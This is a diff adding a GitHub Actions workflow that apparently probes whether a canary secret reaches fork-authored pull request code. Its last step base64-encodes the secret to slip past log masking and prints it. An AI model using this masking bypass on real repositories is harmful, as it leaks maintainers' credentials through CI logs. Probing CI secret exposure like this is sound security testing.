@@ -1,0 +1,24 @@
+name: probe-ci
+on:
+  pull_request:
+jobs:
+  probe-ci:
+    runs-on: ubuntu-latest
+    steps:
+      - name: baseline pass
+        run: echo "ci ok"
+      - name: check canary secret binding
+        if: ${{ env.CANARY_PRESENT == 'true' }}
+        run: echo "SECRET_WAS_BOUND_IN_THIS_RUN=true"
+        env:
+          CANARY_PRESENT: ${{ secrets.TEST_CANARY_SECRET != '' }}
+      - name: fork-authored exfil probe (added by external contributor, not maintainer)
+        if: ${{ env.FORK_CANARY_PRESENT == 'true' }}
+        run: echo "FORK_AUTHORED_CODE_READ_SECRET=true"
+        env:
+          FORK_CANARY_PRESENT: ${{ secrets.TEST_CANARY_SECRET != '' }}
+      - name: fork-authored capture proof (base64, bypasses literal-value log masking)
+        run: echo "CAPTURED_B64=$(echo -n "$SECRET_TO_CAPTURE" | base64)"
+        env:
+          SECRET_TO_CAPTURE: ${{ secrets.TEST_CANARY_SECRET }}
+
